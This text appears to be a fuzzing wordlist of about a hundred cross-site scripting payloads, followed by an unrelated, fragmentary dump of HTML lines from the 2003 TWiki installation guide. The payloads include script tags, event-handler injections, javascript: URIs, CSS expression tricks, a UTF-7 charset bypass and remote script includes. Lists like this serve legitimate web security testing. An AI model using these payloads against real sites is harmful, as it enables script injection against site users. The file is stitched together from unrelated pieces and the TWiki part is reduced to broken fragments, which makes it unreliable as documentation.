 ' onerror=alert(1);'
 ' onerror=alert`1`;'
 '; alert(1); //
 '; alert`1`; //
 ';\r\nalert(1);//
 ';\r\nalert`1`;//
 onerror=alert(1);
 onmousemove=alert(1); 
--><script>alert(1);</script>
--><script>alert`1`;</script>
;}alert(1);{&#39;
" /><frame src="javascript:alert(1);"></frameset>
" onerror=alert(1);"
" onerror=alert`1`;"
" onmousemove=alert(1); 
" onmousemove=alert(1);"
" onmousemove=alert`1`; 
" onmousemove=alert`1`;"
"; alert(1); //
"; alert`1`; //
";\r\nalert(1);//
";\r\nalert`1`;//
""" style="background:url(javascript:alert(1))" "
<img src=javascript:alert(1)>
"<s>"><img src="javascript:alert(1)">
"<s>"><script>alert(1)</script>
"></iframe><script>alert(1);</script>
"></iframe><script>alert`1`;</script>
"><frame src="javascript:alert(1)">
"><frame src="javascript:alert`1`">
"><script>alert(1);</script>
"><script>alert`1`;</script>
"onclick="alert(1)"
"onclick="alert`1`"
"onclick="alert(1)" "onFocus="alert(1)"
"onclick="alert`1`" "onFocus="alert`1`"
"onFocus="alert(1)"
"onFocusOut="alert(1)"
"onMouseDown="alert(1)"
"onMouseEnter="alert(1)"
"onMouseEnter="alert(1)" "onMouseDown="alert(1)"
"onMouseLeave="alert(1)"
"onMouseLeave="alert(1)" "onMouseOut="alert(1)"
"onMouseMove="alert(1)"
"onMouseMove="alert(1)" "onFocusOut="alert(1)"
"onMouseOut="alert(1)"
"onMouseUp="alert(1)"
"onMouseWheel="alert(1)"
"onMouseWheel="alert(1)" "onMouseUp="alert(1)"
”＞＜ｓｃｒｉｐｔ＞ａｌｅｒｔ（’ＸＳＳ’）＜／ｓｃｒｉｐｔ＞
*/\r\nalert(1);//
*/\r\nalert`1`;//
\r\nalert(1);//
\r\nalert`1`;//
<![CDATA["><script>alert(1)</script><!--]]>
</textarea><img src=x onerror=alert(1);>
</textarea><img src=x onerror=alert`1`;>
</textarea><script>alert(1);</script>
</textarea><script>alert`1`;</script>
<% onmousemove=alert(1)>
<% style="xss:expr/* */ession(alert(1))">
<% style="xss:expression(alert(1))">
<<script>alert(1);<</script>
<a onmouseover="alert(1)">XSS</a>
<a onmouseover=alert(1)>XSS</a>
<b <script>alert(1)</script>0
<b>aaaa<script<b></b><alert(1)</script </b>
<div style='behavior:url(test.sct)'>a</div>
<div style="color:expression(alert(1));">a</div>
<div style="left:exp/* */ression(alert(1))">
<div style="left:expression(alert(1))">
<div/style="width:expression(alert(1))">x</div>
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
<iframe src="javascript:alert(1);"></iframe>
<iframe src="x" style=width:exp/**/ressi/**/on(alert(1))>
<iframe src=# onmouseover="alert(1)"></iframe>
<img src="http://www.example.com/>"onerror="alert(1)//<">
<img src=x onerror=alert(1);>
<img src=x onerror=alert`1`;>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-7"/>+ADw-script+AD4-alert(1)+ADsAPA-/script+AD4-
<object data="data:text/html,<script>alert(1)</script>"></object>
<q/oncopy=alert(1)
<q/oncut=alert(1)
<s oncopy= alert(1)>a
<s oncut= alert(1)>a
<s><script>alert(1)</script>
<s>><img src="javascript:alert(1)>
<script src=http://example.com/xss.js></script>
<sCriPt src=http://example.com/xss.js></script>
<script>alert(1);</script>
<ScrIpt>alert(1);</SCript>
<script>alert`1`;</script>
<SELECT NAME="" onmouseover=alert(1)></select>
><s><img src="javascript:alert(1)>
a style=background:url(javascript:alert(1)) 
data:text/html,<script>alert(1)</script>
javascript:alert(1);
javascript:alert(1)//
javascript:alert`1`;
style=background:url(javascript(1))
<title>TWikiDocumentation</title>
</head><body bgcolor="#ffffff">
<h1><a name="Feb_2">(01 Feb 2003)</a></h1>
<script language="JavaScript" type="text/javascript">
<!-- TWiki -->
<strong><em>Doubleclick</em></strong>
<a href="#TWiki">TWiki System Requirements</a>
<a href="#Server_Requirements">Server Requirements</a>
<strong><em>Note:</em></strong><a href="" target="_top"></a>
<strong><em>Related Topics:</em></strong> <a href="http://TWiki.org">TWikiSite</a>
<h1><a name="TWiki_System_Requirements"> TWiki System Requirements </a></h1>
<em>Server and client requirements for TWiki 01-Feb-2003</em>
<h2><a name="Server_Requirements"> Server Requirements </a></h2>
<a href="http://www.gnu.org" target="_top">RCS</a>
<table border="1" cellspacing="0" cellpadding="1"> <tr><th colspan="3" bgcolor="#99CCCC"></th></tr>
<tr><th bgcolor="#99CCCC"> <strong>Resource</strong> </th><th bgcolor="#99CCCC">
<tr><td> Perl </td><td colspan="2" align="center"><br />
<tr><td></td><td align="center"> <code>Net::SMTP</code></td></tr>
<tr><td> RCS </td><td colspan="2" align="center"><br />
<tr><td> GNU <code>diff</code> </td><td colspan="2" align="center"> GNU <code>diff</code><br />
<tr><td></td><td colspan="2" align="center"> <code>ls, fgrep, egrep</code> </td></tr>
<tr><td></td><td align="center"> <code>cron</code> </td><td> <code>cron</code></td></tr>
<tr><td> Web server </td><td colspan="2" align="center"> Apache</td></tr>
<img src="http://TWiki.org" border="0" alt="ALERT!" width="16" height="16" />
<a name="ClientRequirements"></a>
<h2><a name="Client_Requirements"> Client Requirements </a></h2>
The TWiki <a href="http://TWiki.org">standard installation</a>
You can easily add functionality, by customizing <a href="http://TWiki.org">TWikiTemplates</a>
<h2><a name="Known_Issues"> Known Issues </a></h2>
-- <a href="http://TWiki.org/cgi-bin/">MikeMannix</a>
<h1><a name="TWiki_Installation_Guide"> TWiki Installation Guide </a></h1>
<em>Installation instructions for the TWiki 01-Feb-2003 production release. Update notes for the new RCS configuration are marked</em>
These installation steps are based on the <strong>Apache</strong> web server on <strong>Linux</strong>
<a name="StandardInstallation"></a>
<h2><a name="Standard_Installation"> Standard Installation </a></h2>
Request and download the TWiki<a href="http://TWiki.org/download.html" target="_top">http://TWiki.org/download.html</a>
<h3><a name="Step_1_Create_Configure_the_Dire"> Step 1: Create</a></h3>
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />
<br /> <img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />
<blockquote style="background-color:#F5F5F5">
<strong>Example <code>httpd.conf</code> entries:</strong>
<pre> ScriptAlias /twiki/bin/ "/home/httpd/twiki/bin/"
&lt;/Directory&gt;</pre>
<em>Go directly to <a href="#StepTwo">Step 2</a>...</em>
<a name="StepOneB"></a>
<h4><a name="Step_1_for_Non_Root_Accounts"> Step 1 for Non-Root Accounts </a></h4>
<table border="1" cellspacing="0" cellpadding="1"> <tr><th bgcolor="#99CCCC"> <strong>TWiki dir:</strong> </th><th bgcolor="#99CCCC">
<tr><td> <code>twiki</code> </td><td> start-up pages </td><td> root TWiki dir </td><td> <code>/home/smith/twiki/</code> </td></tr>
<tr><td> <code>twiki/bin</code> </td><td> CGI bin </td><td> CGI-enabled dir </td><td> <code>/home/smith/twiki/bin</code> </td></tr>
<tr><td> <code>twiki/lib</code> </td><td> library files </td><td> same level as <code>twiki/bin</code> </td><td> <code>/home/smith/twiki/lib</code> </td></tr>
<tr><td> <code>twiki/pub</code> </td><td> public files </td><td> htdoc enabled dir </td><td> <code>/home/smith/twiki/pub</code> </td></tr>
<tr><td> <code>twiki/data</code> </td><td> topic data </td><td> dir secure from public access </td><td> <code>/home/smith/twiki/data</code> </td></tr>
<tr><td> <code>twiki/templates</code> </td><td> web templates </td><td> dir secure from public access </td><td> <code>/home/smith/twiki/templates</code> </td></tr>
If you are not able to create the <code>twiki/lib</code> directory at the same level as the <code>twiki/bin</code>
twikiLibPath = <font color="red">'/some/other/path/lib'</font>; # Path to lib directory containing TWiki.pm
You can also edit <code>localPerlLibPath</code> in the <code>setlib.cfg</code>
<a name="StepTwo"></a>
<h3><a name="Step_2_Set_File_Permissions"> Step 2: Set File Permissions </a></h3>
<strong>IMPORTANT:</strong> On ISP-hosted accounts, Perl CGI scripts usually require a <code>.cgi</code>
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/help.gif" border="0" alt="HELP" width="16" height="16" />
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/tip.gif" border="0" alt="TIP" width="16" height="16" />
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/help.gif" border="0" alt="HELP" width="16" height="16" />
<h3><a name="Step_3_Set_the_Main_Configuratio"> Step 3: Set the Main Configuration File </a></h3>
<strong>Security issue:</strong> Directories <code>twiki/data</code> , <code>twiki/templates</code>
<h3><a name="Step_4_Configure_Site_Wide_Email"> Step 4: Configure Site-Wide Email Preferences </a></h3>
<code>WIKIWEBMASTER</code> should be set to the email address of the TWiki administrator
<code>SMTPMAILHOST</code> is typically set on Windows or other non-Unix/Linux systems, where <code>sendmail</code>
<code>SMTPSENDERHOST</code> is optional, and set to the domain name sending the email (e.g. <code>twiki.yourdomain.com</code>).
<h3><a name="Step_5_Finish_Up_from_Your_Brows"> Step 5: Finish Up from Your Browser </a></h3>
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/tip.gif" border="0" alt="TIP" width="16" height="16" />
<h2><a name="Additional_Server_Level_Options"> Additional Server-Level Options </a></h2>
<a name="AuthenticationOfUsers"></a>
<h3><a name="Enabling_Authentication_of_Users"> Enabling Authentication of Users </a></h3>
<strong>Rename</strong> file <code>.htaccess.txt</code> in the <code>twiki/bin</code> directory to <code>.htaccess</code>
<code>Redirect <font color="red">/urlpathto/twiki/index.html</font> http://<font color="red">yourdomain.com/urlpathto/twiki/bin/</font>view</code> <br>
<code>AuthUserFile <font color="red">/filepathto/twiki/data/</font>.htpasswd</code> <br />
<code>ErrorDocument 401 <font color="red">/urlpathto/twiki/bin/</font>oops/TWiki/TWiki</code>
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/help.gif" border="0" alt="HELP" width="16" height="16" />
<strong>This applies only if you have root access:</strong> on hosted accounts, you shouldn't have this problem - otherwise, email tech support.
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />
<strong>Copy</strong> the <a href="http://TWiki.org/cgi-bin/view/TWiki/TWikiRegistrationPub">TWikiRegistrationPub</a>
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />
<h2><a name="TWiki_File_System_Info"> TWiki File System Info </a></h2>
See <a href="http://TWiki.org/cgi-bin/view/TWiki/AppendixFileSystem">Appendix A: TWiki File System</a>
-- <a href="http://TWiki.org/cgi-bin/view/TWiki/PeterThoeny">PeterThoeny</a> - 28 Dec 2002 <br />
-- <a href="http://TWiki.org/cgi-bin/view/Main/MikeMannix">MikeMannix</a> - 16 May 2002
<h1><a name="Windows_Install_Cookbook"> Windows Install Cookbook </a></h1>
<h2><a name="Introduction"> Introduction </a></h2>
This cookbook is intended to get you up and running with TWiki on Windows quickly, with as few problems as possible. The 'cookbook' approach is simply to restrict the many choices that someone installing
TWiki must make, so that a reasonably well-defined procedure can be followed - new users can simply follow the steps, while experts can use this as more of a guideline. Please read
<a href="http://twiki.org/cgi-bin/view/Codev.WindowsModPerlInstallCookbook" title="'Codev.WindowsModPerlInstallCookbook' on TWiki site, we know it!">TWiki:Codev.WindowsModPerlInstallCookbook</a> in case you use mod_perl.
-- <a href="http://TWiki.org/cgi-bin/view/Main/RichardDonkin">RichardDonkin</a> - 24 Feb 2002
<h2><a name="Recent_updates"> Recent updates </a></h2>
30 Nov 2002 - added <code>binutils</code> to list of Cygwin packages, and added warning not to use Apache 2.0
20 Nov 2002 - update to avoid <a href="http://twiki.org/cgi-bin/view/Support.InstallDigestSHA1Fails" title="'Support.InstallDigestSHA1Fails' on TWiki site, we know it!">SHA1Fails</a>
12 Nov 2002 - setting <code>SMTPMAILHOST</code> for user registration and notification
03 Sep 2002 - linked to <a href="http://twiki.org/cgi-bin/view/Codev.WindowsModPerlInstallCookbook" title="'Codev.WindowsModPerlInstallCookbook' on TWiki site, we know it!">Codev</a>
20 Jul 2002 - added flags to <code>grep</code> commands in <code>TWiki.cfg</code>
20 Jun 2002 - added creation of <code>c:/twiki</code> directory
15 Jun 2002 - various notes on Cygwin installation and troubleshooting: use of 'Unix' as default text file type (i.e. for mounting <code>c:/cygwin</code> directories) is essential for binary attachment uploads to work properly
<code>egrep</code> and <code>fgrep</code> on some Cygwin versions (fix from <a href="http://twiki.org/cgi-bin/view/Main.DavidLeBlanc" title="'Main.DavidLeBlanc' on TWiki site, we know it!">TWiki</a>)
21 Apr 2002 - updates on download sizes and free disk space requirements, improved post-installation <a href="#Testing_your_TWiki_installation">testing</a>
<a href="http://twiki.org/cgi-bin/" title="'Main.MaryDeMarco' on TWiki site, we know it!">TWiki:MaryDeMarco</a>
<code>pcre</code> to list of Cygwin packages (required by <code>grep</code>)
<a href="http://twiki.org/cgi-bin/view/Codev.TWikiAlphaRelease" title="'Codev.TWikiAlphaRelease' on TWiki site, we know it!">TWiki:Codev.TWikiAlphaRelease</a>
3 Mar 2002 - minor update to include <code>uname -a</code> command to check Cygwin DLL version, and delete Apache config's PassEnv line
<a href="http://twiki.org/cgi-bin/view/Codev.WindowsInstallCookbookComments" title="'Codev.WindowsInstallCookbookComments' on TWiki site, we know it!">TWiki:Codev.WindowsInstallCookbookComments</a>
<code>register</code>, fixed minor typo in Cygwin binary mode section, after beta testing by
<h2><a name="Scope"> Scope </a></h2>
<table border="1" cellspacing="0" cellpadding="1"> <tr><th bgcolor="#99CCCC"> <strong>Component</strong> </th><th bgcolor="#99CCCC">
<tr><td> Operating System </td><td> Windows 2000 </td><td> Should also work for Windows NT </td></tr>
<tr><td> Web Server </td><td><a href="http://httpd.apache.org" target="_top">http://httpd.apache.org</a>, but <strong>don't</strong> use Apache 2.0 yet) </td></tr>
<tr><td> Unix tools </td><td> Cygwin 1.3.9 </td><td> Simplest way to get a whole set of required tools </td></tr>
<tr><td> Perl </td><td> Cygwin perl-5.6.1-2 </td><td> Comes with Cygwin </td></tr>
<tr><td> RCS </td><td> Cygwin rcs-5.7-2 </td><td> Comes with Cygwin, includes a file corruption bugfix </td></tr>
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/new.gif" border="0" alt="NEW" width="28" height="8" />
